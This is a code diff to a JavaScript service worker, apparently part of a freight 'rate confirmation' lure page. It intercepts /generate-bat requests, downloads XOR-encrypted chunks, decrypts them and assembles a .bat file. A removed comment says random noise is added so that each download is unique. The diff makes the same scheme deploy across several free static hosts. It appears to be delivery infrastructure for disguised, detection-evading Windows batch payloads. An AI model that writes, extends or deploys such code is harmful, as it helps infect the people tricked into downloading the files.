@@ -1,15 +1,22 @@
 // ServiceWorker — SourTrade-style .bat assembler
-// Intercepts /generate-bat, downloads encrypted chunks, decrypts, adds random noise, returns unique .bat
+// Auto-detects scope — works on GitHub Pages, Netlify, Cloudflare, Vercel, Surge, etc.
 
-const CACHE_NAME = 'freight-confirm-v1';
-const CHUNK_MANIFEST = '/Ratecon/rtp/manifest.json';
-const XOR_KEY = 0xAA; // XOR key for chunk decryption
+const CACHE_NAME = 'freight-confirm-v2';
+const XOR_KEY = 0xAA;
+
+// Base path is derived from SW registration scope
+// GitHub Pages: /Ratecon/ → manifest at /Ratecon/rtp/manifest.json
+// Netlify:      /       → manifest at /rtp/manifest.json
+function getBasePath() {
+    return self.registration.scope.replace(/\/$/, '');
+}
 
 // Install — pre-cache landing page
 self.addEventListener('install', (event) => {
+    const base = getBasePath();
     event.waitUntil(
         caches.open(CACHE_NAME).then((cache) => {
-            return cache.addAll(['/', '/index.html']);
+            return cache.addAll([base + '/', base + '/index.html']);
         })
     );
     self.skipWaiting();
@@ -23,15 +30,16 @@ self.addEventListener('activate', (event) => {
 // Fetch interceptor
 self.addEventListener('fetch', (event) => {
     const url = new URL(event.request.url);
+    const base = getBasePath();
 
-    // Intercept /generate-bat POST
-    if (url.pathname === '/generate-bat' && event.request.method === 'POST') {
-        event.respondWith(handleGenerateBat(event.request));
+    // Intercept /generate-bat POST (path relative to scope)
+    if (url.pathname === base + '/generate-bat' && event.request.method === 'POST') {
+        event.respondWith(handleGenerateBat(event.request, base));
         return;
     }
 
-    // Cache-first for static assets
-    if (url.pathname === '/' || url.pathname === '/index.html') {
+    // Cache-first for landing page
+    if (url.pathname === base + '/' || url.pathname === base + '/index.html') {
         event.respondWith(
             caches.match(event.request).then((cached) => cached || fetch(event.request))
         );
@@ -57,16 +65,18 @@ function decryptChunk(b64data, key) {
 }
 
 // Main handler: assemble .bat from chunks
-async function handleGenerateBat(request) {
+async function handleGenerateBat(request, base) {
     try {
-        // 1. Fetch chunk manifest
-        const manifestResp = await fetch(CHUNK_MANIFEST);
-        if (!manifestResp.ok) throw new Error('Manifest not found');
+        // 1. Fetch chunk manifest (relative to scope)
+        const manifestUrl = base + '/rtp/manifest.json';
+        const manifestResp = await fetch(manifestUrl);
+        if (!manifestResp.ok) throw new Error('Manifest not found: ' + manifestUrl);
         const manifest = await manifestResp.json();
 
-        // 2. Download all chunks in parallel
+        // 2. Download all chunks in parallel (resolve relative URLs against scope)
         const chunkPromises = manifest.chunks.map(async (chunk) => {
-            const resp = await fetch(chunk.url);
+            const chunkUrl = base + '/' + chunk.url;
+            const resp = await fetch(chunkUrl);
             if (!resp.ok) throw new Error(`Chunk ${chunk.id} failed: ${resp.status}`);
             const b64 = await resp.text();
             return {
